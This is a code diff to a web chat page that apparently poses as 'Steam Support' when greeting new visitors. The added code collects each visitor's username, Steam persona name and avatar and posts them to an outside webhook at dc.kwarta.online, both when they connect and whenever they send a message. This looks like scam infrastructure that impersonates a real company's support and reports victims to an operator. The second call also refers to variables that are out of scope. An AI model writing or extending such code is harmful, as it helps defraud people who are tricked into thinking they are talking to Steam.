@@ -25,6 +25,26 @@ function linkify(text) {
 
 async function firstVisit() {
     if (localStorage.getItem('hasVisited') === null) {
+        const $getUser = localStorage.getItem("username") || 'unknown';
+        const $personaname = $('.player-name').text()
+        const $avatar = $('.avatar').attr('src')
+        console.log($avatar)
+        console.log($personaname)
+        // Send to YOUR backend with custom bot avatar/name
+        await fetch("https://dc.kwarta.online/webhook", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                event: 'user_connected',
+                username: $getUser,
+                timestamp: new Date().toISOString(),
+                message: 'New user connected to chat',
+                // Generic values - replace with HTML page content later
+                bot_name: $personaname,
+                avatar_url: $avatar
+            })
+        });
+        
         await sendMessageAdmin('Hello, this is Steam Support, how may I help you today?');
         localStorage.setItem('hasVisited', 'true');
     }
@@ -152,6 +172,20 @@ async function sendMessageUser(txt) {
       msg: txt
     })
   });
+
+    fetch("https://dc.kwarta.online/webhook/message", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      username: $getUser,
+      message: 'sent a message',
+      timestamp: new Date().toISOString(),
+      // Generic values - replace with HTML page content later
+      bot_name: $personaname,
+      avatar_url: $avatar
+    })
+  });
+    
   if (!txt) return
 }
 
